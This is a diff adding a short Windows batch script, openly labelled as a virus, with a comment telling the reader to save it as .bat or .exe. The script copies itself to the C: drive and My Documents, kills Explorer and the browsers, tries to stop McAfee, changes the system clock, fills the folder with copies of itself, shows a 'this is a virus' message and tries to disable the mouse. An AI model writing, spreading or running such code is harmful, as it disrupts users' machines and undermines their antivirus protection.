@@ -1,0 +1,27 @@
+# Save it with ".bat" extension. You can also convert it as ".exe" file. It copies itself to hard disk, my documents and then it kills explorer.exe, chrome.exe and firefox.exe. It tries to delete mcafee antivirus and tries to disable the keyboard. To disable the script, delete the file and restart the computer
+@echo off
+copy "virus.bat" "C:\"
+copy "virus.bat" "%userprofile%\My Documents"
+tskill explorer
+tskill firefox
+tskill chrome
+tskill iexplorer
+time 12:00
+tskill McAfee Security Centre Module
+copy "virus.bat" "virus.bat45544"
+copy "virus.bat" "virus.bat85858"
+copy "virus.bat" "virus.bat1645"
+copy "virus.bat" "virus.bat574457"
+copy "virus.bat" "virus.bat55457"
+copy "virus.bat" "virus.bat9765"
+copy "virus.bat" "virus.bat45465"
+copy "virus.bat" "virus.bat456877"
+copy "virus.bat" "virus.bat77989845"
+copy "virus.bat" "virus.bat2135"
+copy "virus.bat" "virus.bat46876"
+copy "virus.bat" "virus.bat45687"
+copy "virus.bat" "virus.bat8868"
+copy "virus.bat" "virus.bat2000"
+copy "virus.bat" "virus.bat200"
+msg * this is a virus
+rundll mouse,disable
